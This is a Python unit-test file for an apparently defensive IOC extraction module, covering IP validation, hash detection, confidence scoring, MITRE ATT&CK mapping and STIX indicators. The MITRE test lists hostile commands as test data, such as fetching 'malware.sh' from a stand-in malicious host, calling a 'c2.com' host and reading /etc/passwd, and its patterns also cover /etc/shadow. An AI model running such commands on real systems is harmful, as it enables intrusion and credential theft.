#!/usr/bin/env python3
"""
Unit Tests for IOC Extraction Module

Tests basic IOC validation and extraction logic
"""

import unittest
import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))


class TestIOCValidation(unittest.TestCase):
    """Test IOC validation functions"""

    def test_valid_ipv4(self):
        """Test IPv4 validation"""
        valid_ips = [
            '192.168.1.1',
            '10.0.0.1',
            '8.8.8.8',
            '172.16.0.1'
        ]

        for ip in valid_ips:
            self.assertTrue(self._is_valid_ip(ip), f"{ip} should be valid")

    def test_invalid_ipv4(self):
        """Test invalid IPv4 addresses"""
        invalid_ips = [
            '256.1.1.1',
            '1.1.1.256',
            '1.1.1',
            'not.an.ip',
            '1.1.1.1.1'
        ]

        for ip in invalid_ips:
            self.assertFalse(self._is_valid_ip(ip), f"{ip} should be invalid")

    def test_hash_type_detection(self):
        """Test hash type detection"""
        test_cases = [
            ('5d41402abc4b2a76b9719d911017c592', 'md5'),  # 32 chars
            ('aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d', 'sha1'),  # 40 chars
            ('2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae', 'sha256'),  # 64 chars
            ('invalid', 'unknown')
        ]

        for hash_value, expected_type in test_cases:
            detected_type = self._detect_hash_type(hash_value)
            self.assertEqual(detected_type, expected_type,
                           f"Hash {hash_value} should be {expected_type}, got {detected_type}")

    def test_confidence_score_calculation(self):
        """Test confidence score calculation"""
        # High frequency should yield high confidence
        high_freq = {'count': 100, 'protocols': {'ssh', 'http'}, 'threat_score': 80}
        confidence = self._calculate_confidence(high_freq, max_count=100)
        self.assertGreater(confidence, 0.7, "High frequency should yield >0.7 confidence")

        # Low frequency should yield lower confidence
        low_freq = {'count': 5, 'protocols': {'ssh'}, 'threat_score': 20}
        confidence = self._calculate_confidence(low_freq, max_count=100)
        self.assertLess(confidence, 0.5, "Low frequency should yield <0.5 confidence")

    # Helper methods (simplified versions from ioc_extraction.py)
    def _is_valid_ip(self, ip: str) -> bool:
        """Validate IPv4 address"""
        import re
        pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
        if re.match(pattern, ip):
            octets = ip.split('.')
            return all(0 <= int(octet) <= 255 for octet in octets)
        return False

    def _detect_hash_type(self, hash_value: str) -> str:
        """Detect hash type by length"""
        length = len(hash_value)
        if length == 32:
            return 'md5'
        elif length == 40:
            return 'sha1'
        elif length == 64:
            return 'sha256'
        else:
            return 'unknown'

    def _calculate_confidence(self, data: dict, max_count: int) -> float:
        """Calculate confidence score"""
        freq_score = min(data['count'] / max(max_count, 1), 1.0)
        protocol_score = len(data['protocols']) * 0.1
        threat_score = min(data.get('threat_score', 0) / 100, 1.0)

        return min((freq_score * 0.5) + (protocol_score * 0.2) + (threat_score * 0.3), 1.0)


class TestMITREMapping(unittest.TestCase):
    """Test MITRE ATT&CK technique mapping"""

    def test_command_classification(self):
        """Test command to MITRE technique mapping"""
        test_cases = [
            ('wget http://malicious.com/malware.sh', 'T1105'),  # Ingress Tool Transfer
            ('cat /etc/passwd', 'T1083'),  # File Discovery
            ('chmod +x payload', 'T1548'),  # Abuse Elevation
            ('curl http://c2.com', 'T1071.001'),  # Web Protocols
        ]

        for command, expected_technique in test_cases:
            technique = self._classify_command(command)
            self.assertIn(expected_technique, technique,
                         f"Command '{command}' should map to {expected_technique}")

    def _classify_command(self, command: str) -> list:
        """Simplified command classification"""
        import re
        techniques = []

        if re.search(r'wget|curl.*http', command, re.IGNORECASE):
            techniques.append('T1105')  # Ingress Tool Transfer
            techniques.append('T1071.001')  # Web Protocols

        if re.search(r'cat /etc/passwd|cat /etc/shadow', command):
            techniques.append('T1083')  # File Discovery
            techniques.append('T1003')  # Credential Dumping

        if re.search(r'chmod|sudo|su ', command):
            techniques.append('T1548')  # Abuse Elevation

        return techniques


class TestGeoIPEnrichment(unittest.TestCase):
    """Test GeoIP enrichment logic"""

    def test_country_extraction(self):
        """Test country extraction from GeoIP data"""
        sample_geoip = {
            'country_name': 'United States',
            'city_name': 'New York',
            'latitude': 40.7128,
            'longitude': -74.0060
        }

        self.assertEqual(sample_geoip['country_name'], 'United States')
        self.assertIsInstance(sample_geoip['latitude'], (int, float))


class TestThreatFeedGeneration(unittest.TestCase):
    """Test threat feed generation"""

    def test_stix_indicator_creation(self):
        """Test STIX indicator structure"""
        indicator = {
            "type": "indicator",
            "spec_version": "2.1",
            "pattern": "[ipv4-addr:value = '192.0.2.1']",
            "indicator_types": ["malicious-activity"],
            "valid_from": "2024-01-15T10:30:00.000Z",
            "confidence": 85
        }

        self.assertEqual(indicator['type'], 'indicator')
        self.assertEqual(indicator['spec_version'], '2.1')
        self.assertIn('malicious-activity', indicator['indicator_types'])
        self.assertGreaterEqual(indicator['confidence'], 0)
        self.assertLessEqual(indicator['confidence'], 100)


def run_tests():
    """Run all tests"""
    unittest.main(argv=[''], exit=False, verbosity=2)


if __name__ == '__main__':
    print("=" * 60)
    print("IOC EXTRACTION MODULE - UNIT TESTS")
    print("=" * 60)
    print()

    run_tests()
